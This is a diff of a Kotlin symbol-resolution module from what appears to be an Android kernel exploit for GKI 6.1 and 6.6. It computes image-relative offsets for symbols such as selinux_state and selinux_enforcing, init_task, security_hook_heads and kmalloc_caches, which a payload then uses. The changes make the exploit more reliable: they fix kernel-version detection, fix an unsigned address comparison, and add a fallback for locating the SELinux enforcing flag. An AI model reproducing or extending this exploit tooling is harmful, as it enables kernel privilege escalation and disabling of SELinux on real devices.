@@ -12,23 +12,31 @@ object SymbolResolver {
         "configfs_read_iter", "configfs_bin_write_iter", "copy_splice_read", "noop_llseek",
         // static / unexported symbols — resolved by delta anchoring below
         "nfulnl_logger", "sysctl_bootid", "loggers", "ashmem_fops", "ashmem_misc_fops",
+        // 6.1/6.6 have no bare `selinux_enforcing` global; the flag lives at
+        // offset 0 of the `selinux_state` struct, so we look that up instead.
+        "selinux_state",
         // 6.1 has no copy_splice_read; its generic_file_splice_read fills the slot
         "generic_file_splice_read", "compat_ashmem_ioctl",
     )
 
     fun toConfig(kernelRelease: String, symbols: Map<String, Long>): TargetConfig {
+        // "6.1" must be checked AFTER "6.6" // "6.6.118" contains "6.1"
+        // as a substring (chars 3-5); ordered checks avoid misdetection.
         val family = when {
-            kernelRelease.contains("6.1") -> 61
             kernelRelease.contains("6.6") -> 66
+            kernelRelease.contains("6.1") -> 61
             else -> throw IllegalArgumentException("Unsupported kernel family: $kernelRelease")
         }
         val base = if (family == 61) 0xffffffc008000000UL.toLong() else 0xffffffc080000000UL.toLong()
 
         // kallsyms addresses are absolute (or already relative); normalize to
         // image-relative offsets so the payload can add its own slide.
+        // Compare as unsigned: `base` (0xffffffc0...) is negative as signed
+        // Long, so a signed `>=` is true for every address and produces
+        // garbage nonzero offsets, defeating validation.
         fun off(name: String): Long {
-            val addr = symbols[name] ?: 0L
-            return if (addr >= base) addr - base else addr
+            val addr = symbols[name] ?: return 0L
+            return if (addr.toULong() >= base.toULong()) addr - base else addr
         }
 
         // Delta anchoring for static symbols: they sit at a constant distance
@@ -50,6 +58,11 @@ object SymbolResolver {
         val sysctlBootid = off("sysctl_bootid")
         val randomBootIdData = off("sysctl_bootid").takeIf { it != 0L }
             ?: if (sysctlBootid != 0L) sysctlBootid - if (family == 61) 0x143790L else 0x141e70L else 0L
+
+        // selinux_enforcing is the `bool` at offset 0 of `selinux_state` on
+        // 6.1/6.6 GKI; a bare global may still exist on older kernels.
+        val selinuxEnforcing = off("selinux_enforcing").takeIf { it != 0L }
+            ?: off("selinux_state").takeIf { it != 0L } ?: 0L
 
         val slideInitTask = off("slide_init_task").takeIf { it != 0L } ?: off("init_task")
         val slideRootTaskGroup = off("slide_root_task_group").takeIf { it != 0L } ?: off("root_task_group")
@@ -83,7 +96,7 @@ object SymbolResolver {
                 "noop_llseek" to off("noop_llseek"),
                 "init_task" to off("init_task"),
                 "root_task_group" to off("root_task_group"),
-                "selinux_enforcing" to off("selinux_enforcing"),
+                "selinux_enforcing" to selinuxEnforcing,
                 "selinux_blob_sizes" to off("selinux_blob_sizes"),
                 "security_hook_heads" to off("security_hook_heads"),
                 "kmalloc_caches" to off("kmalloc_caches"),
